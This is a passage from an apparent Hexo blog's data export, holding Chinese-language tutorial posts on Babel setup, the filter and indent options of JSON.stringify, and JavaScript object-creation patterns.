1\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"yvshare.cn\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"license\"</span>: <span class=\"string\">\"ISC\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"devDependencies\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"babel-cli\"</span>: <span class=\"string\">\"^6.26.0\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-使用\"><a href=\"#2-使用\" class=\"headerlink\" title=\"2. 使用\"></a><a name=\"usage\">2. 使用</a></h4><ul>\n<li>我们将把我们的指令放在本地版本的 npm 脚本中，而不是直接通过命令行来运行 Babel.</li>\n</ul>\n<blockquote>\n<p>简单的在你的 package.json 中添加一个 “scripts” 属性并将 babel 命令放在它的 build 属性中：</p>\n</blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"webpack\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"1.0.0\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"test\"</span>: <span class=\"string\">\"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"</span>,</span><br><span class=\"line\">+     \"build\": \"babel src -d lib\"  // 加入这一句命令</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    \"devDependencies\": &#123;</span><br><span class=\"line\">      \"babel-cli\": \"^6.26.0\"</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>现在从我们的终端可以运行以下命令：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run build</span><br></pre></td></tr></table></figure></p>\n<p><em>这会按照和之前一样的方式来运行 Babel 并将输出放在 lib 目录下，唯一不同在于我们现在使用了一个本地拷贝。</em></p>\n<blockquote>\n<p>值得注意的是在babel的build命令是可以在build属性中自行配置的，上面是把src目录下的脚本打包到lib目录中，你也可以打包单个文件…</p>\n</blockquote>\n<h4 id=\"3-创建-babelrc配置文件\"><a href=\"#3-创建-babelrc配置文件\" class=\"headerlink\" title=\"3. 创建.babelrc配置文件\"></a><a name=\"babelrc\">3. 创建.babelrc配置文件</a></h4><ul>\n<li>虽然已经配置好了 Babel ，但并没有让它真正生效。在项目的根目录中创建一个 .babelrc 文件并启用一些插件。 <a href=\"https://babeljs.cn/docs/setup/#installation\" target=\"_blank\" rel=\"noopener\">详看</a></li>\n</ul>\n<p>首先，你可以使用转换 ES2015+ 的 env preset：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install babel-preset-env --save-dev</span><br></pre></td></tr></table></figure></p>\n<p>为了让 preset 生效，你需要像下面这样定义你的 .babelrc 文件：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"presets\"</span>: [<span class=\"string\">\"env\"</span>],</span><br><span class=\"line\">  <span class=\"attr\">\"plugins\"</span>: []</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>.babelrc配置文件非常丰富：</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ES2015转码规则</span></span><br><span class=\"line\">$ npm install --save-dev babel-preset-es2015</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># react转码规则</span></span><br><span class=\"line\">$ npm install --save-dev babel-preset-react</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ES7不同阶段语法提案的转码规则（共有4个阶段），选装一个</span></span><br><span class=\"line\">$ npm install --save-dev babel-preset-stage-0</span><br><span class=\"line\">$ npm install --save-dev babel-preset-stage-1</span><br><span class=\"line\">$ npm install --save-dev babel-preset-stage-2</span><br><span class=\"line\">$ npm install --save-dev babel-preset-stage-3</span><br></pre></td></tr></table></figure>\n<p>最后，我们的 .babelrc 文件可以长这个样：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"presets\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"es2015\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"react\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"stage-2\"</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"plugins\"</span>: []</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"4-Babel-Polyfill\"><a href=\"#4-Babel-Polyfill\" class=\"headerlink\" title=\"4. Babel-Polyfill\"></a><a name=\"polyfill\">4. Babel-Polyfill</a></h4><p>Babel默认只转换新的JavaScript句法（syntax），而不转换新的API，比如Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise等全局对象，以及一些定义在全局对象上的方法（比如<code>Object.assign</code>）都不会转码。</p>\n<p>举例来说，ES6在Array对象上新增了<code>Array.from</code>方法。Babel就不会转码这个方法。如果想让这个方法运行，必须使用babel-polyfill，为当前环境提供一个垫片。</p>\n<p>安装命令如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save babel-polyfill</span><br></pre></td></tr></table></figure></p>\n<p>然后，在脚本头部，加入如下一行代码：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'babel-polyfill'</span>;</span><br><span class=\"line\"><span class=\"comment\">// 或者</span></span><br><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">'babel-polyfill'</span>);</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"5-Babel-Register\"><a href=\"#5-Babel-Register\" class=\"headerlink\" title=\"5. Babel-Register\"></a><a name=\"register\">5. Babel-Register</a></h4><p>babel-register模块改写require命令，为它加上一个钩子。此后，每当使用require加载.js、.jsx、.es和.es6后缀名的文件，就会先用Babel进行转码。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save-dev babel-register</span><br></pre></td></tr></table></figure></p>\n<p>使用时，必须首先加载babel-register：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span>(<span class=\"string\">\"babel-register\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">import</span>(<span class=\"string\">\"./index.js\"</span>);</span><br></pre></td></tr></table></figure></p>\n<p>然后，就不需要手动对index.js转码了。</p>\n<blockquote>\n<p>需要注意的是，babel-register只会对require命令加载的文件转码，而不会对当前文件转码。另外，由于它是实时转码，所以只适合在<code>开发环境</code>使用。</p>\n</blockquote>\n<h4 id=\"后记：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。\"><a href=\"#后记：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。\" class=\"headerlink\" title=\"后记：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。\"></a><code>后记</code>：虽然实际项目上的配置根据实际情况有所不同，但是基本的东西就是这个样子了，以后有类似需求就可以根据文档来进行了，非常方便。</h4><hr>\n<blockquote>\n<p>参考文档： <a href=\"https://babeljs.cn/\" target=\"_blank\" rel=\"noopener\">babeljs.cn</a> / <a href=\"http://www.ruanyifeng.com/blog/2016/01/babel.html?20170213113809\" target=\"_blank\" rel=\"noopener\">ruanyifeng.com</a></p>\n</blockquote>\n"},{"id":"0809005","title":"JSON 序列化选项","date":"2016-09-16T03:46:18.000Z","_content":"\n实际上，JSON.stringify()除了要序列化JavaScript对象外，还可以接受另外两个参数，这两个参数用于指定以不同的方式序列化JavaScript对象。**第一个**参数是个过滤器，可以使一个数组，也可以是个函数；**第二个**参数是一个选项，表示是否在JSON字符串中保留缩进。单独或组合使用者两个参数，可以更全面深入地控制JSON的序列化。\n#### 1. 过滤器（第一个参数）\n1.数组\n```JavaScript\nvar hero = {\n    \"name\": \"MasterYi\",\n    \"skills\": [\n        \"AlphaStrike\"\n    ],\n    \"type\": \"Warrior\"\n}\n\nvar jsonTxt = JSON.stringify(hero, [\"name\", \"type\"]);\njsonTxt --> \"{\"name\":\"MasterYi\",\"type\":\"Warrior\"}\"\n```\n2.函数\n```JavaScript\nvar jsonTxt = JSON.stringify(hero, function(k, v){\n    switch(k){\n        case \"name\":\n            return \"Annie\";\n        case \"type\":\n            return \"Mage\";\n        default:\n            return v;\n    }\n});\njsonTxt --> \"{\"name\":\"Annie\",\"skills\":[\"AlphaStrike\"],\"type\":\"Mage\"}\"\n```\n*值得注意的是，如果函数返回了undefined，那么相应的属性会被忽略。另外请务必写上default，此时返回传入的值，以便其他值都能正常出现在结果中*\n#### 2. 选项（字符串缩进）\n```JavaScript\nvar jsonTxt1 = JSON.stringify(hero, null, 2);\njsonTxt1 -->\n\"{\n  \"name\": \"MasterYi\",\n  \"skills\": [\n    \"AlphaStrike\"\n  ],\n  \"type\": \"Warrior\"\n}\"\n\nvar jsonTxt2 = JSON.stringify(hero, null, 4);\njsonTxt2 -->\n\"{\n    \"name\": \"MasterYi\",\n    \"skills\": [\n        \"AlphaStrike\"\n    ],\n    \"type\": \"Warrior\"\n}\"\n```\n*如上，结果字符串中也插入了换行符，这样一来就提高了可读性。只要传入有效的控制缩进的参数值，结果字符串就会包含换行符。最大缩进空格数为10，大于10会默认转换为10.*\n","source":"_posts/0809005_JSON序列化选项.md","raw":"---\nid: 0809005\ntitle: JSON 序列化选项\ndate: 2016-09-16 11:46:18\ntags:\n    - JavaScript\n    - JSON\ncategories:\n---\n\n实际上，JSON.stringify()除了要序列化JavaScript对象外，还可以接受另外两个参数，这两个参数用于指定以不同的方式序列化JavaScript对象。**第一个**参数是个过滤器，可以使一个数组，也可以是个函数；**第二个**参数是一个选项，表示是否在JSON字符串中保留缩进。单独或组合使用者两个参数，可以更全面深入地控制JSON的序列化。\n#### 1. 过滤器（第一个参数）\n1.数组\n```JavaScript\nvar hero = {\n    \"name\": \"MasterYi\",\n    \"skills\": [\n        \"AlphaStrike\"\n    ],\n    \"type\": \"Warrior\"\n}\n\nvar jsonTxt = JSON.stringify(hero, [\"name\", \"type\"]);\njsonTxt --> \"{\"name\":\"MasterYi\",\"type\":\"Warrior\"}\"\n```\n2.函数\n```JavaScript\nvar jsonTxt = JSON.stringify(hero, function(k, v){\n    switch(k){\n        case \"name\":\n            return \"Annie\";\n        case \"type\":\n            return \"Mage\";\n        default:\n            return v;\n    }\n});\njsonTxt --> \"{\"name\":\"Annie\",\"skills\":[\"AlphaStrike\"],\"type\":\"Mage\"}\"\n```\n*值得注意的是，如果函数返回了undefined，那么相应的属性会被忽略。另外请务必写上default，此时返回传入的值，以便其他值都能正常出现在结果中*\n#### 2. 选项（字符串缩进）\n```JavaScript\nvar jsonTxt1 = JSON.stringify(hero, null, 2);\njsonTxt1 -->\n\"{\n  \"name\": \"MasterYi\",\n  \"skills\": [\n    \"AlphaStrike\"\n  ],\n  \"type\": \"Warrior\"\n}\"\n\nvar jsonTxt2 = JSON.stringify(hero, null, 4);\njsonTxt2 -->\n\"{\n    \"name\": \"MasterYi\",\n    \"skills\": [\n        \"AlphaStrike\"\n    ],\n    \"type\": \"Warrior\"\n}\"\n```\n*如上，结果字符串中也插入了换行符，这样一来就提高了可读性。只要传入有效的控制缩进的参数值，结果字符串就会包含换行符。最大缩进空格数为10，大于10会默认转换为10.*\n","slug":"0809005_JSON序列化选项","published":1,"updated":"2018-03-26T12:15:29.300Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvta0006s4c09an6oacu","content":"<p>实际上，JSON.stringify()除了要序列化JavaScript对象外，还可以接受另外两个参数，这两个参数用于指定以不同的方式序列化JavaScript对象。<strong>第一个</strong>参数是个过滤器，可以使一个数组，也可以是个函数；<strong>第二个</strong>参数是一个选项，表示是否在JSON字符串中保留缩进。单独或组合使用者两个参数，可以更全面深入地控制JSON的序列化。</p>\n<h4 id=\"1-过滤器（第一个参数）\"><a href=\"#1-过滤器（第一个参数）\" class=\"headerlink\" title=\"1. 过滤器（第一个参数）\"></a>1. 过滤器（第一个参数）</h4><p>1.数组<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> hero = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"name\"</span>: <span class=\"string\">\"MasterYi\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"skills\"</span>: [</span><br><span class=\"line\">        <span class=\"string\">\"AlphaStrike\"</span></span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"type\"</span>: <span class=\"string\">\"Warrior\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> jsonTxt = <span class=\"built_in\">JSON</span>.stringify(hero, [<span class=\"string\">\"name\"</span>, <span class=\"string\">\"type\"</span>]);</span><br><span class=\"line\">jsonTxt --&gt; <span class=\"string\">\"&#123;\"</span>name<span class=\"string\">\":\"</span>MasterYi<span class=\"string\">\",\"</span>type<span class=\"string\">\":\"</span>Warrior<span class=\"string\">\"&#125;\"</span></span><br></pre></td></tr></table></figure></p>\n<p>2.函数<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jsonTxt = <span class=\"built_in\">JSON</span>.stringify(hero, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">k, v</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(k)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"name\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"Annie\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"type\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"Mage\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> v;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">jsonTxt --&gt; <span class=\"string\">\"&#123;\"</span>name<span class=\"string\">\":\"</span>Annie<span class=\"string\">\",\"</span>skills<span class=\"string\">\":[\"</span>AlphaStrike<span class=\"string\">\"],\"</span>type<span class=\"string\">\":\"</span>Mage<span class=\"string\">\"&#125;\"</span></span><br></pre></td></tr></table></figure></p>\n<p><em>值得注意的是，如果函数返回了undefined，那么相应的属性会被忽略。另外请务必写上default，此时返回传入的值，以便其他值都能正常出现在结果中</em></p>\n<h4 id=\"2-选项（字符串缩进）\"><a href=\"#2-选项（字符串缩进）\" class=\"headerlink\" title=\"2. 选项（字符串缩进）\"></a>2. 选项（字符串缩进）</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jsonTxt1 = <span class=\"built_in\">JSON</span>.stringify(hero, <span class=\"literal\">null</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">jsonTxt1 --&gt;</span><br><span class=\"line\"><span class=\"string\">\"&#123;</span></span><br><span class=\"line\"><span class=\"string\">  \"</span>name<span class=\"string\">\": \"</span>MasterYi<span class=\"string\">\",</span></span><br><span class=\"line\"><span class=\"string\">  \"</span>skills<span class=\"string\">\": [</span></span><br><span class=\"line\"><span class=\"string\">    \"</span>AlphaStrike<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">  ],</span></span><br><span class=\"line\"><span class=\"string\">  \"</span>type<span class=\"string\">\": \"</span>Warrior<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> jsonTxt2 = <span class=\"built_in\">JSON</span>.stringify(hero, <span class=\"literal\">null</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">jsonTxt2 --&gt;</span><br><span class=\"line\"><span class=\"string\">\"&#123;</span></span><br><span class=\"line\"><span class=\"string\">    \"</span>name<span class=\"string\">\": \"</span>MasterYi<span class=\"string\">\",</span></span><br><span class=\"line\"><span class=\"string\">    \"</span>skills<span class=\"string\">\": [</span></span><br><span class=\"line\"><span class=\"string\">        \"</span>AlphaStrike<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">    ],</span></span><br><span class=\"line\"><span class=\"string\">    \"</span>type<span class=\"string\">\": \"</span>Warrior<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;\"</span></span><br></pre></td></tr></table></figure>\n<p><em>如上，结果字符串中也插入了换行符，这样一来就提高了可读性。只要传入有效的控制缩进的参数值，结果字符串就会包含换行符。最大缩进空格数为10，大于10会默认转换为10.</em></p>\n","site":{"data":{}},"excerpt":"","more":"<p>实际上，JSON.stringify()除了要序列化JavaScript对象外，还可以接受另外两个参数，这两个参数用于指定以不同的方式序列化JavaScript对象。<strong>第一个</strong>参数是个过滤器，可以使一个数组，也可以是个函数；<strong>第二个</strong>参数是一个选项，表示是否在JSON字符串中保留缩进。单独或组合使用者两个参数，可以更全面深入地控制JSON的序列化。</p>\n<h4 id=\"1-过滤器（第一个参数）\"><a href=\"#1-过滤器（第一个参数）\" class=\"headerlink\" title=\"1. 过滤器（第一个参数）\"></a>1. 过滤器（第一个参数）</h4><p>1.数组<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> hero = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"name\"</span>: <span class=\"string\">\"MasterYi\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"skills\"</span>: [</span><br><span class=\"line\">        <span class=\"string\">\"AlphaStrike\"</span></span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"type\"</span>: <span class=\"string\">\"Warrior\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> jsonTxt = <span class=\"built_in\">JSON</span>.stringify(hero, [<span class=\"string\">\"name\"</span>, <span class=\"string\">\"type\"</span>]);</span><br><span class=\"line\">jsonTxt --&gt; <span class=\"string\">\"&#123;\"</span>name<span class=\"string\">\":\"</span>MasterYi<span class=\"string\">\",\"</span>type<span class=\"string\">\":\"</span>Warrior<span class=\"string\">\"&#125;\"</span></span><br></pre></td></tr></table></figure></p>\n<p>2.函数<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jsonTxt = <span class=\"built_in\">JSON</span>.stringify(hero, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">k, v</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(k)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"name\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"Annie\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"type\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"Mage\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> v;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">jsonTxt --&gt; <span class=\"string\">\"&#123;\"</span>name<span class=\"string\">\":\"</span>Annie<span class=\"string\">\",\"</span>skills<span class=\"string\">\":[\"</span>AlphaStrike<span class=\"string\">\"],\"</span>type<span class=\"string\">\":\"</span>Mage<span class=\"string\">\"&#125;\"</span></span><br></pre></td></tr></table></figure></p>\n<p><em>值得注意的是，如果函数返回了undefined，那么相应的属性会被忽略。另外请务必写上default，此时返回传入的值，以便其他值都能正常出现在结果中</em></p>\n<h4 id=\"2-选项（字符串缩进）\"><a href=\"#2-选项（字符串缩进）\" class=\"headerlink\" title=\"2. 选项（字符串缩进）\"></a>2. 选项（字符串缩进）</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jsonTxt1 = <span class=\"built_in\">JSON</span>.stringify(hero, <span class=\"literal\">null</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">jsonTxt1 --&gt;</span><br><span class=\"line\"><span class=\"string\">\"&#123;</span></span><br><span class=\"line\"><span class=\"string\">  \"</span>name<span class=\"string\">\": \"</span>MasterYi<span class=\"string\">\",</span></span><br><span class=\"line\"><span class=\"string\">  \"</span>skills<span class=\"string\">\": [</span></span><br><span class=\"line\"><span class=\"string\">    \"</span>AlphaStrike<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">  ],</span></span><br><span class=\"line\"><span class=\"string\">  \"</span>type<span class=\"string\">\": \"</span>Warrior<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> jsonTxt2 = <span class=\"built_in\">JSON</span>.stringify(hero, <span class=\"literal\">null</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">jsonTxt2 --&gt;</span><br><span class=\"line\"><span class=\"string\">\"&#123;</span></span><br><span class=\"line\"><span class=\"string\">    \"</span>name<span class=\"string\">\": \"</span>MasterYi<span class=\"string\">\",</span></span><br><span class=\"line\"><span class=\"string\">    \"</span>skills<span class=\"string\">\": [</span></span><br><span class=\"line\"><span class=\"string\">        \"</span>AlphaStrike<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">    ],</span></span><br><span class=\"line\"><span class=\"string\">    \"</span>type<span class=\"string\">\": \"</span>Warrior<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;\"</span></span><br></pre></td></tr></table></figure>\n<p><em>如上，结果字符串中也插入了换行符，这样一来就提高了可读性。只要传入有效的控制缩进的参数值，结果字符串就会包含换行符。最大缩进空格数为10，大于10会默认转换为10.</em></p>\n"},{"id":"0809008","title":"JavaScript 面向对象","date":"2017-03-26T07:52:37.000Z","_content":"\n#### 1. 原始方式：\n* 对象字面量方式\n```javascript\nvar Hero = { \n    name: 'MasterYi',\n    skill: 'AlphaStrike',\n    todo: function () { alert(this.name); }\n};\n```\n* Object构造函数方式\n```javascript\nvar Hero = new Object();\n\nHero.name = 'MasterYi';\nHero.skill = 'Q';\nHero.do = function(){\n    return this.name + ' use ' + this.skill + ' kill ' + 'yasuo';\n}\n\nalert( Hero.skill );    // AlphaStrike\nalert( Hero.do() );     // MasterYi use AlphaStrike kill yasuo\n```\n如上，当我们要创建批量的Hero1、Hero2……时，\n每次都要敲很多代码，资深copypaster都吃不消！\n然后就有了下面批量生产的工厂模式。\n\n#### 2. 工厂模式\n```javascript\nfunction heroObj(name, skill){\n    var Hero = new Object();\n\n    Hero.name = name;\n    Hero.skill = skill;\n    Hero.do = function(){\n        return this.name + ' use ' + this.skill + ' kill ' + 'MasterYi';\n    }\n\n    return Hero;\n}\nvar riven = heroObj('yasuo', 'R');\nvar ashe = heroObj('Caitlin', 'W');\n\nalert(riven.skill);     // R\nalert(ashe.do());       // Caitlin use W kill MasterYi\n```\n工厂模式就是批量化生产，简单调用就可以进入造人模式（啪啪啪……）。\n指定姓名年龄就可以造一堆小宝宝啦，解放双手。\n但是由于是工厂暗箱操作的，所以你不能识别这个对象到底是什么类型、\n是人还是狗傻傻分不清（instanceof 测试为 Object），\n另外每次造人时都要创建一个独立的temp对象，代码臃肿，你受得了？\n\n#### 3. 构造函数\n```javascript\nfunction HeroObj(name, skill){\n\n    this.name = name;\n    this.skill = skill;\n    this.do = function(){\n        return this.name + ' use ' + this.skill + ' kill ' + 'MasterYi';\n    }\n\n}\n\nvar riven = new heroObj('yasuo', 'R');\nvar ashe = new heroObj('Caitlin', 'W');\n\nalert(riven.skill);     // R\nalert(ashe.do());       // Caitlin use W kill MasterYi\n```\nECMAScript中的构造函数可以用来创建特定类型的对象。像Object和Array的原生的构造函数，在运行时会自动出现在执行环境中。此外，也可以创建自定义的构造函数，从而定义自定义对象类型的属性和方法。\n\n#### 4. 原型模式\n* 直接使用 prototype 属性\n```javascript\nfunction Hero () {}\nHero.prototype.name = 'MasterYi';\nHero.prototype.skill = 'AlphaStrike';\nHero.prototype.do = function () { alert(this.name); };\n```\n* 字面量定义方式\n```javascript\nfunction Hero () {}\nHero.prototype = {\n    name: 'MasterYi',\n    skill: 'AlphaStrike',\n    sayName: function () { alert(this.name); }\n};\nvar p1 = new Hero(); //name='MasterYi'\nvar p2 = new Hero(); //name='MasterYi'\n```\n这里需要注意的是原型属性和方法的共享，即所有实例中都只是引用原型中的属性方法，任何一个地方产生的改动会引起其他实例的变化。\n\n#### 5. 混合模式\n```javascript\nfunction Hero (name, skill) {\n    this.name = name;\n    this.skill = skill;\n}\nHero.prototype = {\n    skillLists: ['Q', 'W', 'E', 'R'];\n    sayName: function () {\n        alert(this.name);\n    },\n    do: function () {\n        alert(this.name + ' use ' + this.skill + ' kill ' + 'MasterYi');\n    }\n};\nvar p1 = new Hero('yasuo', 'R');\nvar p2 = new Hero('ashe', 'w');\np1.sayName();   // 